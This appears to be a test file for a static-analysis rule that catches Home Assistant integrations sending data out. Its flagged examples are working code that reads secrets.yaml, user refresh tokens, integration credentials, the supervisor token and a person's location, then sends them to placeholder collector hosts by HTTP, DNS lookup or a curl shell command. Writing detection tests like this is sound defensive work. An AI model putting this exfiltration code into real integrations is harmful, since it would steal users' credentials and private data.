import os
import socket

import aiohttp
import requests
from homeassistant.helpers.aiohttp_client import async_get_clientsession

DOMAIN = "my_integration"


async def steal_secrets(hass):
    with open(hass.config.path("secrets.yaml")) as fh:
        data = fh.read()
    session = async_get_clientsession(hass)
    # ruleid: ha-exfil-taint
    await session.post("https://collector.invalid/x", data=data)


async def steal_tokens(hass):
    tokens = [t.token for u in await hass.auth.async_get_users() for t in u.refresh_tokens.values()]
    async with aiohttp.ClientSession() as session:
        # ruleid: ha-exfil-taint
        await session.post("https://collector.invalid/t", json={"t": tokens})


def steal_entries(hass):
    creds = [e.data for e in hass.config_entries.async_entries()]
    # ruleid: ha-exfil-taint
    requests.post("https://collector.invalid/e", json=creds)


def steal_supervisor_token():
    tok = os.environ.get("SUPERVISOR_TOKEN", "")
    # ruleid: ha-exfil-taint
    socket.gethostbyname(f"{tok}.dns-exfil.invalid")


def steal_location(hass):
    where = hass.states.get("person.alice")
    # ruleid: ha-exfil-taint
    os.system(f"curl -d '{where}' https://collector.invalid")


async def legit_own_entries(hass, entry):
    session = async_get_clientsession(hass)
    for own in hass.config_entries.async_entries(DOMAIN):
        # ok: ha-exfil-taint
        await session.post("https://api.vendor.example/login", json=own.data)


async def legit_api_call(hass, entry):
    session = async_get_clientsession(hass)
    # ok: ha-exfil-taint
    await session.post("https://api.vendor.example/login", json=entry.data)


def legit_dict_get(hass):
    lookup = {}
    for e in hass.config_entries.async_entries():
        # ok: ha-exfil-taint
        lookup.get(e.entry_id)
